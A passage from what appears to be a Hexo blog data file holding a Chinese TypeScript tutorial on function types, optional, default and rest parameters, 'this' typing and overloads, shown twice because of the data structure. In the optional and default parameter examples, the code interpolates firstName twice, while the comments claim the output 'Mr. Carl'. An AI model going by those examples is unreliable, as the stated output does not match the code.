class=\"keyword\">return</span> x + y &#125;</span><br><span class=\"line\">    <span class=\"comment\">// (baseValue: number, increase: number) =&gt; number = function (x: number, y: number): number &#123; return x + y &#125;</span></span><br></pre></td></tr></table></figure>\n<p>有没有发现原本简单明了的函数表达式变的更加难以理解了?没关系，定义函数的时候还是可以使用 <code>简写写法</code>，<code>typescript</code> 会自动帮我们转化。</p>\n<p><strong>类型推导</strong><br>非常简单，不再叙述，<a href=\"https://www.tslang.cn/docs/handbook/functions.html\" target=\"_blank\" rel=\"noopener\">详见这里</a>。</p>\n<h4 id=\"可选参数与默认参数\"><a href=\"#可选参数与默认参数\" class=\"headerlink\" title=\"可选参数与默认参数\"></a>可选参数与默认参数</h4><p>看过前面 <code>interface</code> 的可选形式，对这里函数的可选形式应该不会陌生，它们的表现形式完全一样。至于默认参数，写过 <code>es6</code> 函数语法的应该已经非常熟悉了。</p>\n<p><strong>可选参数</strong><br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">yourName</span>(<span class=\"params\">firstName: <span class=\"built_in\">string</span>, lastName?: <span class=\"built_in\">string</span></span>): <span class=\"title\">string</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(lastName) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">`<span class=\"subst\">$&#123;firstName&#125;</span> <span class=\"subst\">$&#123;firstName&#125;</span>`</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> firstName;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">yourName(); <span class=\"comment\">// -&gt; error，最少传入一个参数</span></span><br><span class=\"line\">yourName(<span class=\"string\">'Carl'</span>); <span class=\"comment\">// -&gt; success, 'Carl'</span></span><br><span class=\"line\">yourName(<span class=\"string\">'Mr.'</span>, <span class=\"string\">'Carl'</span>); <span class=\"comment\">// success, 'Mr. Carl'</span></span><br><span class=\"line\">yourName(<span class=\"string\">'Mr.'</span>, <span class=\"string\">'Carl'</span>, <span class=\"string\">'Jhon'</span>); <span class=\"comment\">// error, 参数太多</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>默认参数</strong><br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 需要注意的是 参数位置 不能更改</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">yourName</span>(<span class=\"params\">firstName: <span class=\"built_in\">string</span>, lastName = 'Jhon'</span>): <span class=\"title\">string</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">`<span class=\"subst\">$&#123;firstName&#125;</span> <span class=\"subst\">$&#123;firstName&#125;</span>`</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">yourName(); <span class=\"comment\">// -&gt; error，最少传入一个参数</span></span><br><span class=\"line\">yourName(<span class=\"string\">'Mr.'</span>); <span class=\"comment\">// -&gt; success， 'Mr. Jhon'</span></span><br><span class=\"line\">yourName(<span class=\"string\">'Mr.'</span>, <span class=\"literal\">undefined</span>); <span class=\"comment\">// -&gt; success， 'Mr. Jhon'</span></span><br><span class=\"line\">yourName(<span class=\"string\">'Mr.'</span>, <span class=\"string\">'Carl'</span>); <span class=\"comment\">// -&gt; success， 'Mr. Carl'</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"剩余参数\"><a href=\"#剩余参数\" class=\"headerlink\" title=\"剩余参数\"></a>剩余参数</h4><p>剩余参数使用的是 <code>es6</code> 的 <code>rest剩余参数</code> 语法(没有使用过的人可以点击<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Rest_parameters\" target=\"_blank\" rel=\"noopener\">这里</a>查看)。<code>typescript</code> 中的 <code>剩余参数</code> 的使用方式和 <code>es6</code> 中完全一致。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">x: <span class=\"built_in\">number</span>, ...restArgs: <span class=\"built_in\">number</span>[]</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> total = x;</span><br><span class=\"line\">    restArgs.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">        total += item</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> total;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>); <span class=\"comment\">// -&gt; 15</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"this\"><a href=\"#this\" class=\"headerlink\" title=\"this\"></a>this</h4><p>关于 <code>this</code> 这里不说太多，网上关于它的文章太多了。<br>关于使用 <code>箭头函数</code> 对 <code>this</code> 的影响可以查看我前面写的一片文章<a href=\"https://thenightelf.github.io/2018/01/03/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/\" target=\"_blank\" rel=\"noopener\">箭头函数</a>;</p>\n<p><code>typescript</code> 中对于函数 <code>this</code> 的处理放在了参数中进行约束。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Card &#123;</span><br><span class=\"line\">    suit: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">    card: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> Deck &#123;</span><br><span class=\"line\">    suits: <span class=\"built_in\">string</span>[];</span><br><span class=\"line\">    cards: <span class=\"built_in\">number</span>[];</span><br><span class=\"line\">    createCardPicker(<span class=\"keyword\">this</span>: Deck): <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> Card;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> deck: Deck = &#123;</span><br><span class=\"line\">    suits: [<span class=\"string\">\"hearts\"</span>, <span class=\"string\">\"spades\"</span>, <span class=\"string\">\"clubs\"</span>, <span class=\"string\">\"diamonds\"</span>],</span><br><span class=\"line\">    cards: <span class=\"built_in\">Array</span>(<span class=\"number\">52</span>),</span><br><span class=\"line\">    <span class=\"comment\">// 在参数中约定 this 为 Deck 类型</span></span><br><span class=\"line\">    createCardPicker: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"><span class=\"keyword\">this</span>: Deck</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> pickedCard = <span class=\"built_in\">Math</span>.floor(<span class=\"built_in\">Math</span>.random() * <span class=\"number\">52</span>);</span><br><span class=\"line\">            <span class=\"keyword\">let</span> pickedSuit = <span class=\"built_in\">Math</span>.floor(pickedCard / <span class=\"number\">13</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> &#123;suit: <span class=\"keyword\">this</span>.suits[pickedSuit], card: pickedCard % <span class=\"number\">13</span>&#125;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> cardPicker = deck.createCardPicker();</span><br><span class=\"line\"><span class=\"keyword\">let</span> pickedCard = cardPicker();</span><br><span class=\"line\"></span><br><span class=\"line\">alert(<span class=\"string\">\"card: \"</span> + pickedCard.card + <span class=\"string\">\" of \"</span> + pickedCard.suit);</span><br></pre></td></tr></table></figure>\n<h4 id=\"函数重载\"><a href=\"#函数重载\" class=\"headerlink\" title=\"函数重载\"></a>函数重载</h4><p>不同于 <code>javascript</code> 的函数重载，<code>typescript</code> 中重复的对于一个函数进行定义，只要 <code>参数与返回值类型</code> 不同，就不会相互覆盖。<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// javascript</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">say</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'hi'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">say</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'hello'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">say(); <span class=\"comment\">// -&gt; hello</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// typescript</span></span><br><span class=\"line\"><span class=\"comment\">// 官方的例子比较直接，这里直接使用官方的例子</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> suits = [<span class=\"string\">\"hearts\"</span>, <span class=\"string\">\"spades\"</span>, <span class=\"string\">\"clubs\"</span>, <span class=\"string\">\"diamonds\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 对于函数 pickCard 的参数与返回值进行约束</span></span><br><span class=\"line\"><span class=\"comment\">// 约束参数类型为 &#123;suit: string; card: number; &#125;[] 类型时，返回值类型为 number</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pickCard</span>(<span class=\"params\">x: &#123;suit: <span class=\"built_in\">string</span>; card: <span class=\"built_in\">number</span>; &#125;[]</span>): <span class=\"title\">number</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 约束参数类型为 number 类型时，返回值类型为 &#123;suit: string; card: number; &#125;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pickCard</span>(<span class=\"params\">x: <span class=\"built_in\">number</span></span>): </span>&#123;suit: <span class=\"built_in\">string</span>; card: <span class=\"built_in\">number</span>; &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 主体处理函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pickCard</span>(<span class=\"params\">x</span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> x == <span class=\"string\">\"object\"</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> pickedCard = <span class=\"built_in\">Math</span>.floor(<span class=\"built_in\">Math</span>.random() * x.length);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> pickedCard;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> x == <span class=\"string\">\"number\"</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> pickedSuit = <span class=\"built_in\">Math</span>.floor(x / <span class=\"number\">13</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> &#123; suit: suits[pickedSuit], card: x % <span class=\"number\">13</span> &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> myDeck = [&#123; suit: <span class=\"string\">\"diamonds\"</span>, card: <span class=\"number\">2</span> &#125;, &#123; suit: <span class=\"string\">\"spades\"</span>, card: <span class=\"number\">10</span> &#125;, &#123; suit: <span class=\"string\">\"hearts\"</span>, card: <span class=\"number\">4</span> &#125;];</span><br><span class=\"line\"><span class=\"keyword\">let</span> pickedCard1 = myDeck[pickCard(myDeck)];</span><br><span class=\"line\">alert(<span class=\"string\">\"card: \"</span> + pickedCard1.card + <span class=\"string\">\" of \"</span> + pickedCard1.suit);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> pickedCard2 = pickCard(<span class=\"number\">15</span>);</span><br><span class=\"line\">alert(<span class=\"string\">\"card: \"</span> + pickedCard2.card + <span class=\"string\">\" of \"</span> + pickedCard2.suit);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// -&gt; error，没有一个重载的参数约束为 string</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> pickedCard3 = pickCard(<span class=\"string\">'15'</span>);</span><br><span class=\"line\">alert(<span class=\"string\">\"card: \"</span> + pickedCard3.card + <span class=\"string\">\" of \"</span> + pickedCard3.suit);</span><br></pre></td></tr></table></figure></p>\n<p><strong>这里需要注意的是</strong>：如果通过重载对函数进行约束之后，那么该函数只能接受重载的定义类型。</p>\n","site":{"data":{}},"excerpt":"<p>本文将会介绍 <code>typescript</code> 中函数的相关内容。<br>","more":"</p>\n<h3 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h3><h4 id=\"函数定义\"><a href=\"#函数定义\" class=\"headerlink\" title=\"函数定义\"></a>函数定义</h4><p>此处略过。</p>\n<h4 id=\"函数类型\"><a href=\"#函数类型\" class=\"headerlink\" title=\"函数类型\"></a>函数类型</h4><p>在函数定义的时候我们可以为函数指定 <code>参数类型</code> 与 <code>返回类型</code>。</p>\n <figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 指定 add 函数接受两个 number 类型的参数x,y，返回一个 number 类型的值</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">x: <span class=\"built_in\">number</span>, y: <span class=\"built_in\">number</span></span>) :<span class=\"title\">number</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x + y;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面这种写法是 <code>typescript</code> 中最常见的函数类型写法，不过这是一种 <code>简写写法</code>。</p>\n<p><strong>完整写法：</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> add: </span><br><span class=\"line\">    <span class=\"comment\">//       这是 参数类型 部分         =              这是 返回值类型 部分</span></span><br><span class=\"line\">    (x: <span class=\"built_in\">number</span>, y: <span class=\"built_in\">number</span>) =&gt; <span class=\"built_in\">number</span> = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">x: <span class=\"built_in\">number</span>, y: <span class=\"built_in\">number</span></span>): <span class=\"title\">number</span> </span>&#123; <span class=\"keyword\">return</span> x + y &#125;</span><br><span class=\"line\">    <span class=\"comment\">// (baseValue: number, increase: number) =&gt; number = function (x: number, y: number): number &#123; return x + y &#125;</span></span><br></pre></td></tr></table></figure>\n<p>有没有发现原本简单明了的函数表达式变的更加难以理解了?没关系，定义函数的时候还是可以使用 <code>简写写法</code>，<code>typescript</code> 会自动帮我们转化。</p>\n<p><strong>类型推导</strong><br>非常简单，不再叙述，<a href=\"https://www.tslang.cn/docs/handbook/functions.html\" target=\"_blank\" rel=\"noopener\">详见这里</a>。</p>\n<h4 id=\"可选参数与默认参数\"><a href=\"#可选参数与默认参数\" class=\"headerlink\" title=\"可选参数与默认参数\"></a>可选参数与默认参数</h4><p>看过前面 <code>interface</code> 的可选形式，对这里函数的可选形式应该不会陌生，它们的表现形式完全一样。至于默认参数，写过 <code>es6</code> 函数语法的应该已经非常熟悉了。</p>\n<p><strong>可选参数</strong><br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">yourName</span>(<span class=\"params\">firstName: <span class=\"built_in\">string</span>, lastName?: <span class=\"built_in\">string</span></span>): <span class=\"title\">string</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(lastName) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">`<span class=\"subst\">$&#123;firstName&#125;</span> <span class=\"subst\">$&#123;firstName&#125;</span>`</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> firstName;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">yourName(); <span class=\"comment\">// -&gt; error，最少传入一个参数</span></span><br><span class=\"line\">yourName(<span class=\"string\">'Carl'</span>); <span class=\"comment\">// -&gt; success, 'Carl'</span></span><br><span class=\"line\">yourName(<span class=\"string\">'Mr.'</span>, <span class=\"string\">'Carl'</span>); <span class=\"comment\">// success, 'Mr. Carl'</span></span><br><span class=\"line\">yourName(<span class=\"string\">'Mr.'</span>, <span class=\"string\">'Carl'</span>, <span class=\"string\">'Jhon'</span>); <span class=\"comment\">// error, 参数太多</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>默认参数</strong><br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 需要注意的是 参数位置 不能更改</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">yourName</span>(<span class=\"params\">firstName: <span class=\"built_in\">string</span>, lastName = 'Jhon'</span>): <span class=\"title\">string</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">`<span class=\"subst\">$&#123;firstName&#125;</span> <span class=\"subst\">$&#123;firstName&#125;</span>`</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">yourName(); <span class=\"comment\">// -&gt; error，最少传入一个参数</span></span><br><span class=\"line\">yourName(<span class=\"string\">'Mr.'</span>); <span class=\"comment\">// -&gt; success， 'Mr. Jhon'</span></span><br><span class=\"line\">yourName(<span class=\"string\">'Mr.'</span>, <span class=\"literal\">undefined</span>); <span class=\"comment\">// -&gt; success， 'Mr. Jhon'</span></span><br><span class=\"line\">yourName(<span class=\"string\">'Mr.'</span>, <span class=\"string\">'Carl'</span>); <span class=\"comment\">// -&gt; success， 'Mr. Carl'</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"剩余参数\"><a href=\"#剩余参数\" class=\"headerlink\" title=\"剩余参数\"></a>剩余参数</h4><p>剩余参数使用的是 <code>es6</code> 的 <code>rest剩余参数</code> 语法(没有使用过的人可以点击<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Rest_parameters\" target=\"_blank\" rel=\"noopener\">这里</a>查看)。<code>typescript</code> 中的 <code>剩余参数</code> 的使用方式和 <code>es6</code> 中完全一致。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">x: <span class=\"built_in\">number</span>, ...restArgs: <span class=\"built_in\">number</span>[]</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> total = x;</span><br><span class=\"line\">    restArgs.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">        total += item</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> total;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>); <span class=\"comment\">// -&gt; 15</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"this\"><a href=\"#this\" class=\"headerlink\" title=\"this\"></a>this</h4><p>关于 <code>this</code> 这里不说太多，网上关于它的文章太多了。<br>关于使用 <code>箭头函数</code> 对 <code>this</code> 的影响可以查看我前面写的一片文章<a href=\"https://thenightelf.github.io/2018/01/03/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/\" target=\"_blank\" rel=\"noopener\">箭头函数</a>;</p>\n<p><code>typescript</code> 中对于函数 <code>this</code> 的处理放在了参数中进行约束。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Card &#123;</span><br><span class=\"line\">    suit: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">    card: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> Deck &#123;</span><br><span class=\"line\">    suits: <span class=\"built_in\">string</span>[];</span><br><span class=\"line\">    cards: <span class=\"built_in\">number</span>[];</span><br><span class=\"line\">    createCardPicker(<span class=\"keyword\">this</span>: Deck): <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> Card;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> deck: Deck = &#123;</span><br><span class=\"line\">    suits: [<span class=\"string\">\"hearts\"</span>, <span class=\"string\">\"spades\"</span>, <span class=\"string\">\"clubs\"</span>, <span class=\"string\">\"diamonds\"</span>],</span><br><span class=\"line\">    cards: <span class=\"built_in\">Array</span>(<span class=\"number\">52</span>),</span><br><span class=\"line\">    <span class=\"comment\">// 在参数中约定 this 为 Deck 类型</span></span><br><span class=\"line\">    createCardPicker: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"><span class=\"keyword\">this</span>: Deck</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> pickedCard = <span class=\"built_in\">Math</span>.floor(<span class=\"built_in\">Math</span>.random() * <span class=\"number\">52</span>);</span><br><span class=\"line\">            <span class=\"keyword\">let</span> pickedSuit = <span class=\"built_in\">Math</span>.floor(pickedCard / <span class=\"number\">13</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> &#123;suit: <span class=\"keyword\">this</span>.suits[pickedSuit], card: pickedCard % <span class=\"number\">13</span>&#125;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> cardPicker = deck.createCardPicker();</span><br><span class=\"line\"><span class=\"keyword\">let</span> pickedCard = cardPicker();</span><br><span class=\"line\"></span><br><span class=\"line\">alert(<span class=\"string\">\"card: \"</span> + pickedCard.card + <span class=\"string\">\" of \"</span> + pickedCard.suit);</span><br></pre></td></tr></table></figure>\n<h4 id=\"函数重载\"><a href=\"#函数重载\" class=\"headerlink\" title=\"函数重载\"></a>函数重载</h4><p>不同于 <code>javascript</code> 的函数重载，<code>typescript</code> 中重复的对于一个函数进行定义，只要 <code>参数与返回值类型</code> 不同，就不会相互覆盖。<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// javascript</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">say</span>(<span 